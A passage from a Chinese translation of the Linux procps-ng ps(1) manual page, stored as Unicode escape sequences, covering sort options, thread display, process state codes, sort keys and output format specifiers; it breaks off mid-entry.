\u9009\u9879\u8bed\u6cd5\u662f O[+|-]k1[,[+|-]k2[,...]]\u3002\u5b83\u6839\u636e\u7531\u4e00\u7cfb\u5217 \u77ed\u952e k1,k2,... \u63cf\u8ff0\u7684\u591a\u7ea7\u6392\u5e8f\u987a\u5e8f\u5bf9\u8fdb\u7a0b\u5217\u8868\u8fdb\u884c\u6392\u5e8f\u3002\"+\" \u76ee\u524d\u662f\u53ef\u9009\u7684\uff0c\u4ec5 \u91cd\u7533\u952e\u4e0a\u7684\u9ed8\u8ba4\u65b9\u5411\uff0c\u4f46\u53ef\u4ee5\u5e2e\u52a9\u533a\u5206 O \u6392\u5e8f\u548c O \u683c\u5f0f\u3002\"\u2013\" \u4ec5\u5728\u5176\u524d\u9762\u7684\u952e\u4e0a\u53cd\u8f6c\u65b9\u5411\u3002 --rows n \u8bbe\u7f6e\u5c4f\u5e55\u9ad8\u5ea6\u3002 S \u6c47\u603b\u4e00\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982 CPU \u4f7f\u7528\u60c5\u51b5\uff0c\u4ece\u5df2\u6b7b\u4ea1\u7684\u5b50\u8fdb\u7a0b\u4e2d\u6c47\u603b\u5230\u5b83\u4eec\u7684\u7236\u8fdb\u7a0b\u4e2d\u3002\u8fd9\u5bf9\u4e8e \u68c0\u67e5\u4e00\u4e2a\u7236\u8fdb\u7a0b\u91cd\u590d\u6d3e\u751f\u77ed\u751f\u547d\u5468\u671f\u5b50\u8fdb\u7a0b\u8fdb\u884c\u5de5\u4f5c\u7684\u7cfb\u7edf\u5f88\u6709\u7528\u3002 --sort spec \u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u6392\u5e8f\u8bed\u6cd5\u4e3a[+|-]key[,[+|-]key[,...]]\u3002\u4ece\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u9009\u62e9\u591a \u5b57\u6bcd\u952e\u3002\u7531\u4e8e\u9ed8\u8ba4\u65b9\u5411\u662f\u9012\u589e\u7684\u6570\u5b57\u6216\u5b57\u6bcd\u987a\u5e8f\uff0c\u56e0\u6b64\u201c+\u201d\u662f\u53ef\u9009\u7684\u3002\u4e0e k \u76f8\u540c\u3002 \u4f8b\u5982\uff1aps jax --sort=uid,-ppid,+pid w \u5bbd\u8f93\u51fa\u3002\u6b64\u9009\u9879\u4f7f\u7528\u4e24\u6b21\u4ee5\u83b7\u5f97\u65e0\u9650\u5bbd\u5ea6\u3002 -w \u5bbd\u8f93\u51fa\u3002\u6b64\u9009\u9879\u4f7f\u7528\u4e24\u6b21\u4ee5\u83b7\u5f97\u65e0\u9650\u5bbd\u5ea6\u3002 --width n \u8bbe\u7f6e\u5c4f\u5e55\u5bbd\u5ea6\u3002 \u7ebf\u7a0b\u663e\u793a H \u663e\u793a\u7ebf\u7a0b\uff0c\u4eff\u4f5b\u5b83\u4eec\u662f\u8fdb\u7a0b\u3002 -L \u663e\u793a\u7ebf\u7a0b\uff0c\u53ef\u80fd\u5e26\u6709 LWP \u548c NLWP \u5217\u3002 m \u5728\u8fdb\u7a0b\u540e\u663e\u793a\u7ebf\u7a0b\u3002 -m \u5728\u8fdb\u7a0b\u540e\u663e\u793a\u7ebf\u7a0b\u3002 -T \u663e\u793a\u7ebf\u7a0b\uff0c\u53ef\u80fd\u5e26\u6709 SPID \u5217\u3002 \u5176\u4ed6\u4fe1\u606f --help section \u6253\u5370\u5e2e\u52a9\u4fe1\u606f\u3002section \u53c2\u6570\u53ef\u4ee5\u662f simple, list, output, threads, misc \u6216 all \u4e4b\u4e00\u3002 \u53c2\u6570\u53ef\u4ee5\u7f29\u5199\u4e3a\u4e00\u4e2a\u4e0b\u5212\u7ebf\u5b57\u6bcd\uff0c\u5982\uff1as|l|o|t|m|a\u3002 --info \u6253\u5370\u8c03\u8bd5\u4fe1\u606f\u3002 L \u5217\u51fa\u6240\u6709\u683c\u5f0f\u8bf4\u660e\u7b26\u3002 V \u6253\u5370 procps-ng \u7248\u672c\u3002 -V \u6253\u5370 procps-ng \u7248\u672c\u3002 --version \u6253\u5370 procps-ng \u7248\u672c\u3002 \u6ce8\u610f\u4e8b\u9879 \u8be5 ps \u901a\u8fc7\u8bfb\u53d6 /proc \u4e2d\u7684\u865a\u62df\u6587\u4ef6\u5de5\u4f5c\u3002\u6b64 ps \u4e0d\u9700\u8981\u8bbe\u7f6e\u4e3a setuid kmem \u6216\u5177\u6709\u4efb\u4f55\u6743\u9650\u5373\u53ef\u8fd0\u884c\u3002 \u4e0d\u8981\u7ed9\u4e88\u6b64 ps \u4efb\u4f55\u7279\u6b8a\u6743\u9650\u3002 CPU \u4f7f\u7528\u60c5\u51b5\u76ee\u524d\u8868\u793a\u4e3a\u8fdb\u7a0b\u6574\u4e2a\u751f\u547d\u5468\u671f\u5185\u8fd0\u884c\u6240\u82b1\u8d39\u65f6\u95f4\u7684\u767e\u5206\u6bd4\u3002\u8fd9\u5e76\u4e0d\u7406\u60f3\uff0c \u4e5f\u4e0d\u7b26\u5408 ps \u5176\u4ed6\u65b9\u9762\u7b26\u5408\u7684\u6807\u51c6\u3002CPU \u4f7f\u7528\u60c5\u51b5\u4e0d\u592a\u53ef\u80fd\u6b63\u597d\u52a0\u8d77\u6765\u4e3a 100%\u3002 SIZE \u548c RSS \u5b57\u6bb5\u4e0d\u5305\u62ec\u8fdb\u7a0b\u7684\u4e00\u4e9b\u90e8\u5206\uff0c\u5305\u62ec\u9875\u8868\u3001\u5185\u6838\u5806\u6808\u3001struct thread_info \u548c struct task_struct\u3002\u8fd9\u901a\u5e38\u81f3\u5c11\u5360\u7528 20 KiB \u7684\u5e38\u9a7b\u5185\u5b58\u3002SIZE \u662f\u8fdb\u7a0b\u7684\u865a\u62df\u5927\u5c0f\uff08\u4ee3\u7801 + \u6570\u636e + \u6808\uff09\u3002 \u6807\u8bb0\u4e3a <defunct> \u7684\u8fdb\u7a0b\u662f\u5df2\u6b7b\u8fdb\u7a0b\uff08\u6240\u8c13\u7684\u201c\u50f5\u5c38\u201d\uff09\uff0c\u56e0\u4e3a\u5b83\u4eec\u7684\u7236\u8fdb\u7a0b\u6ca1\u6709\u6b63\u786e\u9500\u6bc1\u5b83\u4eec\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u9000\u51fa\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u5c06\u7531 init(8) \u9500\u6bc1\u3002 \u5982\u679c\u7528\u6237\u540d\u7684\u957f\u5ea6\u8d85\u8fc7\u663e\u793a\u5217\u7684\u957f\u5ea6\uff0c\u5219\u7528\u6237\u540d\u5c06\u88ab\u622a\u65ad\u3002\u8bf7\u53c2\u89c1 -o \u548c -O \u683c\u5f0f\u5316\u9009\u9879\u4ee5\u81ea\u5b9a\u4e49\u957f\u5ea6\u3002 ps -aux \u7b49\u547d\u4ee4\u9009\u9879\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u4e24\u4e2a\u4e0d\u540c\u6807\u51c6\u7684\u6df7\u5408\u3002\u6839\u636e POSIX \u548c UNIX \u6807\u51c6\uff0c \u4e0a\u8ff0\u547d\u4ee4\u8981\u6c42\u663e\u793a\u6240\u6709\u5177\u6709 TTY \u7684\u8fdb\u7a0b\uff08\u901a\u5e38\u662f\u7528\u6237\u6b63\u5728\u8fd0\u884c\u7684\u547d\u4ee4\uff09\u4ee5\u53ca\u6240\u6709\u7531\u540d\u4e3a x \u7684\u7528\u6237 \u62e5\u6709\u7684\u8fdb\u7a0b\u3002\u5982\u679c\u8be5\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u5219 ps \u5c06\u5047\u8bbe\u60a8\u5b9e\u9645\u4e0a\u662f\u6307 ps aux\u3002 \u8fdb\u7a0b\u6807\u5fd7 \u8fd9\u4e9b\u503c\u7684\u603b\u548c\u663e\u793a\u5728\u7531\u6807\u5fd7\u8f93\u51fa\u8bf4\u660e\u7b26\u63d0\u4f9b\u7684\u201cF\u201d\u5217\u4e2d\uff1a 1 forked \u4f46\u6ca1\u6709 exec 4 \u4f7f\u7528\u4e86\u8d85\u7ea7\u7528\u6237\u6743\u9650 \u8fdb\u7a0b\u72b6\u6001\u4ee3\u7801 \u8fd9\u91cc\u662f s, stat \u548c state \u8f93\u51fa\u8bf4\u660e\u7b26\uff08\u6807\u9898\u4e3a\u201cSTAT\u201d\u6216\u201cS\u201d\uff09\u5c06\u663e\u793a\u7684\u4e0d\u540c\u503c\uff0c\u4ee5\u63cf\u8ff0\u8fdb\u7a0b\u7684\u72b6\u6001\uff1a D \u4e0d\u53ef\u4e2d\u65ad\u7761\u7720\uff08\u901a\u5e38\u4e3a I/O\uff09 I \u7a7a\u95f2\u5185\u6838\u7ebf\u7a0b R \u8fd0\u884c\u6216\u53ef\u8fd0\u884c\uff08\u5728\u8fd0\u884c\u961f\u5217\u4e2d\uff09 S \u53ef\u4e2d\u65ad\u7761\u7720\uff08\u7b49\u5f85\u4e8b\u4ef6\u5b8c\u6210\uff09 T \u88ab\u4f5c\u4e1a\u63a7\u5236\u4fe1\u53f7\u505c\u6b62 t \u5728\u8ddf\u8e2a\u671f\u95f4\u88ab\u8c03\u8bd5\u5668\u505c\u6b62 W \u5206\u9875\uff08\u81ea 2.6.xx \u5185\u6838\u4ee5\u6765\u65e0\u6548\uff09 X \u6b7b\u4ea1\uff08\u4e0d\u5e94\u770b\u5230\uff09 Z \u50f5\u5c38\u8fdb\u7a0b\uff0c\u5df2\u7ec8\u6b62\u4f46\u672a\u88ab\u5176\u7236\u8fdb\u7a0b\u56de\u6536 \u5bf9\u4e8e BSD \u683c\u5f0f\u548c\u4f7f\u7528 stat \u5173\u952e\u5b57\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u5176\u4ed6\u5b57\u7b26\uff1a < \u9ad8\u4f18\u5148\u7ea7\uff08\u5bf9\u5176\u4ed6\u7528\u6237\u4e0d\u53cb\u597d\uff09 N \u4f4e\u4f18\u5148\u7ea7\uff08\u5bf9\u5176\u4ed6\u7528\u6237\u53cb\u597d\uff09 L \u9875\u9762\u9501\u5b9a\u5230\u5185\u5b58\u4e2d\uff08\u7528\u4e8e\u5b9e\u65f6\u548c\u81ea\u5b9a\u4e49 I/O\uff09 s \u662f\u4f1a\u8bdd\u9886\u5bfc l \u662f\u591a\u7ebf\u7a0b\u7684\uff08\u4f7f\u7528 CLONE_THREAD\uff0c\u5982 NPTL pthreads\uff09 + \u662f\u524d\u53f0\u8fdb\u7a0b\u7ec4 \u8fc7\u65f6\u7684\u6392\u5e8f\u952e \u8fd9\u4e9b\u952e\u7531 BSD O \u9009\u9879\u4f7f\u7528\uff08\u5f53\u5b83\u7528\u4e8e\u6392\u5e8f\u65f6\uff09\u3002GNU --sort \u9009\u9879\u4e0d\u4f7f\u7528\u8fd9\u4e9b\u952e\uff0c \u800c\u662f\u4f7f\u7528\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u63cf\u8ff0\u7684\u8bf4\u660e\u7b26\u3002\u8bf7\u6ce8\u610f\uff0c\u7528\u4e8e\u6392\u5e8f\u7684\u503c\u662f ps \u4f7f\u7528\u7684\u5185\u90e8\u503c\uff0c \u800c\u4e0d\u662f\u67d0\u4e9b\u8f93\u51fa\u683c\u5f0f\u5b57\u6bb5\u4e2d\u4f7f\u7528\u7684\u201c\u52a0\u5de5\u201d\u503c\uff08\u4f8b\u5982\uff0c\u6309 tty \u6392\u5e8f\u5c06\u6392\u5e8f\u4e3a\u8bbe\u5907\u53f7\uff0c \u800c\u4e0d\u662f\u6839\u636e\u663e\u793a\u7684\u7ec8\u7aef\u540d\u79f0\u6392\u5e8f\uff09\u3002\u5982\u679c\u60a8\u60f3\u6309\u52a0\u5de5\u503c\u6392\u5e8f\uff0c\u8bf7\u5c06 ps \u8f93\u51fa\u7ba1\u9053\u4f20\u8f93\u5230 sort(1) \u547d\u4ee4\u3002 \u952e \u957f\u683c\u5f0f \u63cf\u8ff0 c cmd \u53ef\u6267\u884c\u6587\u4ef6\u7684\u7b80\u5355\u540d\u79f0 C pcpu CPU \u4f7f\u7528\u7387 f flags \u6807\u5fd7\uff0c\u5982\u957f\u683c\u5f0f F \u5b57\u6bb5 g pgrp \u8fdb\u7a0b\u7ec4 ID G tpgid \u63a7\u5236 tty \u7684\u8fdb\u7a0b\u7ec4 ID j cutime \u7d2f\u8ba1\u7528\u6237\u65f6\u95f4 J cstime \u7d2f\u8ba1\u7cfb\u7edf\u65f6\u95f4 k utime \u7528\u6237\u65f6\u95f4 m min_flt \u6b21\u8981\u9875\u9762\u9519\u8bef\u6570 M maj_flt \u4e3b\u8981\u9875\u9762\u9519\u8bef\u6570 n cmin_flt \u7d2f\u8ba1\u6b21\u8981\u9875\u9762\u9519\u8bef\u6570 N cmaj_flt \u7d2f\u8ba1\u4e3b\u8981\u9875\u9762\u9519\u8bef\u6570 o session \u4f1a\u8bdd ID p pid \u8fdb\u7a0b ID P ppid \u7236\u8fdb\u7a0b ID r rss \u5e38\u9a7b\u96c6\u5927\u5c0f R resident \u5e38\u9a7b\u9875\u9762 s size \u5185\u5b58\u5927\u5c0f\uff08\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\uff09 S share \u5171\u4eab\u9875\u9762\u7684\u6570\u91cf t tty \u63a7\u5236 tty \u7684\u8bbe\u5907\u53f7 T start_time \u8fdb\u7a0b\u5f00\u59cb\u65f6\u95f4 U uid \u7528\u6237 ID \u53f7 u user \u7528\u6237\u540d v vsize \u603b\u865a\u62df\u5185\u5b58\u5927\u5c0f\uff08\u4ee5 KiB \u4e3a\u5355\u4f4d\uff09 y priority \u5185\u6838\u8c03\u5ea6\u4f18\u5148\u7ea7 AIX \u683c\u5f0f\u63cf\u8ff0\u7b26 \u8be5 ps \u652f\u6301 AIX \u683c\u5f0f\u63cf\u8ff0\u7b26\uff0c\u5176\u5de5\u4f5c\u65b9\u5f0f\u7c7b\u4f3c\u4e8e printf(1) \u548c printf(3) \u7684\u683c\u5f0f\u4ee3\u7801\u3002 \u4f8b\u5982\uff0c\u53ef\u4ee5\u4f7f\u7528\u6b64\u547d\u4ee4\u751f\u6210\u6b63\u5e38\u7684\u9ed8\u8ba4\u8f93\u51fa\uff1aps -eo \"%p %y %x %c\"\u3002\u4ee5\u4e0b\u662f\u6b63\u5e38\u4ee3\u7801\u7684\u63cf\u8ff0\u3002 \u4ee3\u7801 \u6b63\u5e38 \u6807\u9898 %C pcpu %CPU %G group GROUP %P ppid PPID %U user USER %a args COMMAND %c comm COMMAND %g rgroup RGROUP %n nice NI %p pid PID %r pgid PGID %t etime ELAPSED %u ruser RUSER %x time TIME %y tty TTY %z vsz VSZ \u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26 \u4ee5\u4e0b\u662f\u53ef\u7528\u4e8e\u63a7\u5236\u8f93\u51fa\u683c\u5f0f\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 -o \u9009\u9879\uff09\u6216\u4f7f\u7528 GNU \u98ce\u683c --sort \u9009\u9879\u5bf9\u9009\u5b9a\u8fdb\u7a0b\u8fdb\u884c\u6392\u5e8f\u7684\u4e0d\u540c\u5173\u952e\u5b57\u3002 \u4f8b\u5982\uff1aps -eo pid,user,args --sort user \u6b64\u7248\u672c\u7684 ps \u5c1d\u8bd5\u8bc6\u522b\u5927\u591a\u6570\u5176\u4ed6 ps \u5b9e\u73b0\u4e2d\u4f7f\u7528\u7684\u5173\u952e\u5b57\u3002 \u4ee5\u4e0b\u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u8bf4\u660e\u7b26\u53ef\u80fd\u5305\u542b\u7a7a\u683c\uff1aargs, cmd, comm, command, fname, ucmd, ucomm, lstart, bsdstart, start\u3002 \u67d0\u4e9b\u5173\u952e\u5b57\u53ef\u80fd\u4e0d\u53ef\u7528\u4e8e\u6392\u5e8f\u3002 \u4ee3\u7801 \u6807\u9898 \u63cf\u8ff0 %cpu %CPU \u8fdb\u7a0b\u7684 CPU \u5229\u7528\u7387\uff0c\u4ee5\u201c##.#\u201d\u683c\u5f0f\u8868\u793a\u3002\u76ee\u524d\uff0c\u5b83\u662f\u8fdb\u7a0b\u4f7f\u7528\u7684 CPU \u65f6\u95f4\u9664\u4ee5\u8fdb\u7a0b\u8fd0\u884c\u7684\u65f6\u95f4\uff08cputime/realtime \u6bd4\u7387\uff09\uff0c\u4ee5\u767e\u5206\u6bd4\u8868\u793a\u3002\u4e0d\u4e00\u5b9a\u52a0\u8d77\u6765\u4e3a 100%\u3002\uff08\u522b\u540d pcpu\uff09\u3002 %mem %MEM \u8fdb\u7a0b\u7684\u5e38\u9a7b\u96c6\u5927\u5c0f\u4e0e\u673a\u5668\u7269\u7406\u5185\u5b58\u7684\u6bd4\u7387\uff0c\u4ee5\u767e\u5206\u6bd4\u8868\u793a\u3002\uff08\u522b\u540d pmem\uff09\u3002 args COMMAND \u547d\u4ee4\u53ca\u5176\u6240\u6709\u53c2\u6570\u4f5c\u4e3a\u5b57\u7b26\u4e32\u663e\u793a\u3002\u53c2\u6570\u7684\u4fee\u6539\u53ef\u80fd\u4f1a\u663e\u793a\u5728\u5185\u3002\u6b64\u5217\u4e2d\u7684\u8f93\u51fa\u53ef\u80fd\u5305\u542b\u7a7a\u683c\u3002\u6807\u8bb0\u4e3a <defunct> \u7684\u8fdb\u7a0b\u662f\u90e8\u5206\u6b7b\u4ea1\u7684\uff0c\u7b49\u5f85\u7236\u8fdb\u7a0b\u5b8c\u5168\u9500\u6bc1\u3002\u6709\u65f6\uff0c\u8fdb\u7a0b\u53c2\u6570\u4e0d\u53ef\u7528\uff1b\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cps \u5c06\u6253\u5370\u53ef\u6267\u884c\u6587\u4ef6\u540d\uff0c\u62ec\u53f7\u4e2d\u663e\u793a\u3002\uff08\u522b\u540d cmd, command\uff09\u3002\u53c2\u89c1 comm \u683c\u5f0f\u5173\u952e\u5b57\u3001-f \u9009\u9879\u548c c \u9009\u9879\u3002 \u5f53\u6700\u540e\u6307\u5b9a\u6b64\u5217\u65f6\uff0c\u8be5\u5217\u5c06\u5ef6\u4f38\u5230\u663e\u793a\u7684\u8fb9\u7f18\u3002\u5982\u679c ps \u65e0\u6cd5\u786e\u5b9a\u663e\u793a\u5bbd\u5ea6\uff0c\u4f8b\u5982\u8f93\u51fa\u88ab\u91cd\u5b9a\u5411\uff08\u7ba1\u9053\uff09\u5230\u6587\u4ef6\u6216\u5176\u4ed6\u547d\u4ee4\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u672a\u5b9a\u4e49\uff08\u53ef\u80fd\u4e3a 80\uff0c\u6216\u65e0\u9650\uff0c\u6216\u7531 TERM \u53d8\u91cf\u786e\u5b9a\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff09\u3002\u53ef\u4ee5\u4f7f\u7528 COLUMNS \u73af\u5883\u53d8\u91cf\u6216 --cols \u9009\u9879\u6765\u51c6\u786e\u786e\u5b9a\u6b64\u60c5\u51b5\u7684\u5bbd\u5ea6\u3002w \u6216 -w \u9009\u9879\u4e5f\u53ef\u7528\u4e8e\u8c03\u6574\u5bbd\u5ea6\u3002 blocked BLOCKED \u88ab\u963b\u585e\u4fe1\u53f7\u7684\u63a9\u7801\uff0c\u53c2\u89c1 signal(7)\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig_block, sigmask\uff09\u3002 bsdstart START \u547d\u4ee4\u542f\u52a8\u65f6\u95f4\u3002\u5982\u679c\u8fdb\u7a0b\u5728\u8fc7\u53bb 24 \u5c0f\u65f6\u5185\u542f\u52a8\uff0c\u8f93\u51fa\u683c\u5f0f\u4e3a\u201c HH:MM\u201d\uff0c\u5426\u5219\u4e3a\u201c Mmm:SS\u201d\uff08\u5176\u4e2d Mmm \u662f\u6708\u4efd\u7684\u4e09\u4e2a\u5b57\u6bcd\uff09\u3002\u53c2\u89c1 lstart\u3001start\u3001start_time \u548c stime\u3002 bsdtime TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u7528\u6237 + \u7cfb\u7edf\u3002\u663e\u793a\u683c\u5f0f\u901a\u5e38\u4e3a\u201cMMM:SS\u201d\uff0c\u4f46\u5982\u679c\u8fdb\u7a0b\u4f7f\u7528\u4e86\u8d85\u8fc7 999 \u5206\u949f\u7684 CPU \u65f6\u95f4\uff0c\u5219\u53ef\u4ee5\u5411\u53f3\u79fb\u52a8\u3002 c C \u5904\u7406\u5668\u5229\u7528\u7387\u3002\u76ee\u524d\uff0c\u8fd9\u662f\u8fdb\u7a0b\u751f\u547d\u5468\u671f\u5185\u767e\u5206\u6bd4\u4f7f\u7528\u7387\u7684\u6574\u6570\u503c\u3002\uff08\u53c2\u89c1 %cpu\uff09\u3002 caught CAUGHT \u6355\u83b7\u7684\u4fe1\u53f7\u63a9\u7801\uff0c\u53c2\u89c1 signal(7)\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig_catch, sigcatch\uff09\u3002 cgname CGNAME \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u540d\u79f0\u3002 cgroup CGROUP \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u3002 class CLS \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7c7b\u3002\uff08\u522b\u540d policy, cls\uff09\u3002\u5b57\u6bb5\u7684\u53ef\u80fd\u503c\u4e3a\uff1a - \u672a\u62a5\u544a TS SCHED_OTHER FF SCHED_FIFO RR SCHED_RR B SCHED_BATCH ISO SCHED_ISO IDL SCHED_IDLE DLN SCHED_DEADLINE ? \u672a\u77e5\u503c cls CLS \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7c7b\u3002\uff08\u522b\u540d policy, cls\uff09\u3002\u5b57\u6bb5\u7684\u53ef\u80fd\u503c\u4e3a\uff1a - \u672a\u62a5\u544a TS SCHED_OTHER FF SCHED_FIFO RR SCHED_RR B SCHED_BATCH ISO SCHED_ISO IDL SCHED_IDLE DLN SCHED_DEADLINE ? \u672a\u77e5\u503c cmd CMD \u53c2\u89c1 args\u3002\uff08\u522b\u540d args, command\uff09\u3002 comm COMMAND \u547d\u4ee4\u540d\u79f0\uff08\u4ec5\u53ef\u6267\u884c\u6587\u4ef6\u540d\uff09\u3002\u4e0d\u4f1a\u663e\u793a\u547d\u4ee4\u540d\u79f0\u7684\u4fee\u6539\u3002\u6807\u8bb0\u4e3a <defunct> \u7684\u8fdb\u7a0b\u662f\u90e8\u5206\u6b7b\u4ea1\u7684\uff0c\u7b49\u5f85\u7236\u8fdb\u7a0b\u5b8c\u5168\u9500\u6bc1\u3002\u6b64\u5217\u4e2d\u7684\u8f93\u51fa\u53ef\u80fd\u5305\u542b\u7a7a\u683c\u3002\uff08\u522b\u540d ucmd, ucomm\uff09\u3002\u53c2\u89c1 args \u683c\u5f0f\u5173\u952e\u5b57\u3001-f \u9009\u9879\u548c c \u9009\u9879\u3002 \u5f53\u6700\u540e\u6307\u5b9a\u6b64\u5217\u65f6\uff0c\u8be5\u5217\u5c06\u5ef6\u4f38\u5230\u663e\u793a\u7684\u8fb9\u7f18\u3002\u5982\u679c ps \u65e0\u6cd5\u786e\u5b9a\u663e\u793a\u5bbd\u5ea6\uff0c\u4f8b\u5982\u8f93\u51fa\u88ab\u91cd\u5b9a\u5411\uff08\u7ba1\u9053\uff09\u5230\u6587\u4ef6\u6216\u5176\u4ed6\u547d\u4ee4\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u672a\u5b9a\u4e49\uff08\u53ef\u80fd\u4e3a 80\uff0c\u6216\u65e0\u9650\uff0c\u6216\u7531 TERM \u53d8\u91cf\u786e\u5b9a\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff09\u3002\u53ef\u4ee5\u4f7f\u7528 COLUMNS \u73af\u5883\u53d8\u91cf\u6216 --cols \u9009\u9879\u6765\u51c6\u786e\u786e\u5b9a\u6b64\u60c5\u51b5\u7684\u5bbd\u5ea6\u3002w \u6216 -w \u9009\u9879\u4e5f\u53ef\u7528\u4e8e\u8c03\u6574\u5bbd\u5ea6\u3002 command COMMAND \u53c2\u89c1 args\u3002\uff08\u522b\u540d args, command\uff09\u3002 cp CP \u6bcf\u5343 CPU \u4f7f\u7528\u7387\uff08\u767e\u5206\u4e4b\u4e00\u7684\u5341\u5206\u4e4b\u4e00\uff09\u3002\uff08\u53c2\u89c1 %cpu\uff09\u3002 cputime TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u201c[DD-]hh:mm:ss\u201d\u683c\u5f0f\u3002\uff08\u522b\u540d time\uff09\u3002 cputimes TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff08\u522b\u540d times\uff09\u3002 drs DRS \u6570\u636e\u5e38\u9a7b\u96c6\u5927\u5c0f\uff0c\u5206\u914d\u7ed9\u975e\u53ef\u6267\u884c\u4ee3\u7801\u7684\u7269\u7406\u5185\u5b58\u91cf\u3002 egid EGID \u8fdb\u7a0b\u7684\u6709\u6548\u7ec4 ID \u53f7\uff0c\u4ee5\u5341\u8fdb\u5236\u6574\u6570\u8868\u793a\u3002\uff08\u522b\u540d gid\uff09\u3002 egroup EGROUP \u8fdb\u7a0b\u7684\u6709\u6548\u7ec4 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d group\uff09\u3002 eip EIP \u6307\u4ee4\u6307\u9488\u3002 esp ESP \u6808\u6307\u9488\u3002 etime ELAPSED \u81ea\u8fdb\u7a0b\u542f\u52a8\u4ee5\u6765\u7684\u7ecf\u8fc7\u65f6\u95f4\uff0c\u683c\u5f0f\u4e3a [[DD-]hh:]mm:ss\u3002 etimes ELAPSED \u81ea\u8fdb\u7a0b\u542f\u52a8\u4ee5\u6765\u7684\u7ecf\u8fc7\u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002 euid EUID \u6709\u6548\u7528\u6237 ID\uff08\u522b\u540d uid\uff09\u3002 euser EUSER \u6709\u6548\u7528\u6237\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002n \u9009\u9879\u53ef\u4ee5\u7528\u4e8e\u5f3a\u5236\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d uname, user\uff09\u3002 exe EXE \u53ef\u6267\u884c\u6587\u4ef6\u7684\u8def\u5f84\u3002\u5982\u679c\u8def\u5f84\u65e0\u6cd5\u901a\u8fc7 cmd\u3001comm \u6216 args \u683c\u5f0f\u9009\u9879\u6253\u5370\uff0c\u5219\u5f88\u6709\u7528\u3002 f F \u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u6807\u5fd7\uff0c\u53c2\u89c1\u8fdb\u7a0b\u6807\u5fd7\u90e8\u5206\u3002\uff08\u522b\u540d flag, flags\uff09\u3002 fgid FGID \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7ec4 ID\u3002\uff08\u522b\u540d fsgid\uff09\u3002 fgroup FGROUP \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7ec4 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d fsgroup\uff09\u3002 flag F \u53c2\u89c1 f\u3002\uff08\u522b\u540d f, flags\uff09\u3002 flags F \u53c2\u89c1 f\u3002\uff08\u522b\u540d f, flag\uff09\u3002 fname COMMAND \u8fdb\u7a0b\u53ef\u6267\u884c\u6587\u4ef6\u540d\u79f0\u7684\u524d 8 \u4e2a\u5b57\u8282\u3002\u6b64\u5217\u4e2d\u7684\u8f93\u51fa\u53ef\u80fd\u5305\u542b\u7a7a\u683c\u3002 fuid FUID \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7528\u6237 ID\u3002\uff08\u522b\u540d fsuid\uff09\u3002 fuser FUSER \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7528\u6237 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 gid GID \u53c2\u89c1 egid\u3002\uff08\u522b\u540d egid\uff09\u3002 group GROUP \u53c2\u89c1 egroup\u3002\uff08\u522b\u540d 